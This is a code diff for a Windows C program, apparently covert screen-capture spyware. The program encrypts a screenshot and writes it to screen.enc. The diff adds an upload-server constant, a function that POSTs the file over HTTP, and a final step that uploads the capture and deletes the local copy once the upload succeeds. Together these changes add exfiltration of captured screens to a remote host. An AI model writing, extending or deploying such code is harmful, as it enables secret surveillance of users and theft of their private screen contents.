@@ -38,6 +38,8 @@ http://thelegendofrandom.com/blog/archives/2231
 #include "polarssl/md.h"
 #include "zlib/zconf.h"
 #include "zlib/zlib.h"
+#include "simple_http.h"
+#include "zmem.h"
 
 //not really needed
 #define WIN32_LEAN_AND_MEAN
@@ -58,7 +60,7 @@ properties->Linker->general->Additional Library Directories (set to: libfiles di
 #define DBG_WARNING 2
 #define DBG_ERROR 3
 
-
+#define UPLOAD_SERVER	"http://skdfhskldfhaklsfdkbmbtrmetbwapipoipzipxziqpwiepqwieopqwep/"
 /*
 	prints out messages to file
 	It being error messages, thus unencrypted be careful
@@ -489,6 +491,38 @@ int compressdata(unsigned char *tocompress, int tocompresslen, unsigned char **d
 	return estimatedcompressedlen;
 }
 
+int uploadscreenshot(char *url, char *filename){
+	unsigned char *http_response_content = NULL;
+	HANDLE tempfile = NULL;
+	DWORD tempfilesize = 0;
+	unsigned char *readbuffer;
+	DWORD readbytes = 0;
+	DWORD http_response_code = -1;
+
+	tempfile = CreateFile(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (tempfile == INVALID_HANDLE_VALUE){
+		return 0;
+	}
+	tempfilesize = GetFileSize(tempfile, NULL);
+	readbuffer = malloc(tempfilesize);
+	
+	if (readbuffer == NULL){
+		return 0;
+	}
+
+	if (!ReadFile(tempfile, readbuffer, tempfilesize, &readbytes, NULL)){
+		zfree(readbuffer);
+		return 0;
+	}
+	CloseHandle(tempfile);
+	http_response_code = http_post_binary(url, readbuffer, tempfilesize, &http_response_content);
+	zfree(readbuffer);
+	if (http_response_code == 200){
+		return 1;
+	}
+	return 0;
+}
+
 /*
 	main logic, output file format:
 	[length encrypted key data(int)][encrypted key data][encrypted hmac key][hmac][encrypted bmp data]
@@ -557,6 +591,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		hmac(encrypted screenshot)
 		write hmac
 		write screenshot
+		send screenshot
+		delete screenshot
+
+		In case you are wondering why locally save and delete,
+		so that we don't loose screenshots if the sending fails.
 
 	*/
 	aeskey = generatekey(keypersonalisation,256);
@@ -654,5 +693,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	free(encrypteddata);
 	free(pubkeyencrypteddata);
 	outputerror(DBG_INFO,"%s\n","main::finished");
+
+	/* now we send the file to our server if it works, we delete the file */
+	if (uploadscreenshot(UPLOAD_SERVER, "screen.enc") == 1){
+		DeleteFile("screen.enc");
+	}
 	return 0;
 }
